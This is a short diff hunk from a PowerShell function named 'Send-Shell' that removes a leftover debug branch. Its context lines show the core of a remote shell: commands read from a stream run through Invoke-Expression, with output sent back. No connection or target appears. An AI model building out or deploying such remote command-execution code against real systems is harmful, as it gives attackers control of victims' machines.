@@ -113,9 +113,6 @@ function Send-Shell
                 $StreamWriter.Flush()
                 continue
             }
-        }elseif($cmd.StartsWith('get')){
-            Write-Host 'QUAAAAA'
-        }
 
         $Output = try {
                         $out = Invoke-Expression $cmd 2>&1 | Out-String
